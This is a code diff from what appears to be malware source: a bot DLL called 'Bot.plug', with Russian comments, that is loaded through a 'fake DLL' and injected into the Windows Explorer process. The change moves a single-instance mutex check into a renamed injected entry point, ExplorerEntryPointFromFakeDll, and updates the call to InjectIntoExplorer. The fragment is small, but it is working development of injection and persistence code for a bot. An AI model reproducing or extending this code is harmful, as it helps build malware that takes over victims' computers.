@@ -171,13 +171,6 @@ DWORD WINAPI ExplorerMain(LPVOID Data)
 {
 	BOT::Initialize();
 
-	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug
-	// в explorer
-	bool Catched = TryToCatchHostLevelInstanceMutex("bplfklexpl");
-
-	DLLDBG("ExplorerMain", "TryToCatchHostLevelInstanceMutex() result=%d", Catched);
-	if (Catched == false) return 0;
-
 	DLLDBG("====>Bot DLL", "Запускаем бот. Префикс [%s]", GetPrefix().t_str());
 	
 	//UnhookDlls();
@@ -230,9 +223,16 @@ extern"C"  void WINAPI Start(LPVOID, LPVOID, LPVOID)
 
 
 // Ф-ция для прыжка в Explorer при загрузке из StartFromFakeDll
-DWORD WINAPI ExplorerRoutine( LPVOID lpData )
+DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 {
-	// При загрузке просто вызывает Start, предусмотренную для 
+	// Пробуем захватить мьютекс для обеспечения единственного Bot.plug
+	// в explorer
+	bool Catched = TryToCatchHostLevelInstanceMutex("bplfklexpl");
+
+	DLLDBG("ExplorerEntryPointFromFakeDll", "TryToCatchHostLevelInstanceMutex() result=%d", Catched);
+	if (Catched == false) return 0;
+
+	// При загрузке просто вызывает Start, предусмотренную для
 	// обычного запуска Bot.plug
 	Start(NULL, NULL, NULL);
 	return 0;
@@ -250,7 +250,7 @@ BOOL WINAPI StartFromFakeDll()
 
 	if (Catched == false) return FALSE;
 
-	InjectIntoExplorer(ExplorerRoutine);
+	InjectIntoExplorer(ExplorerEntryPointFromFakeDll);
 
 	return FALSE;
 }
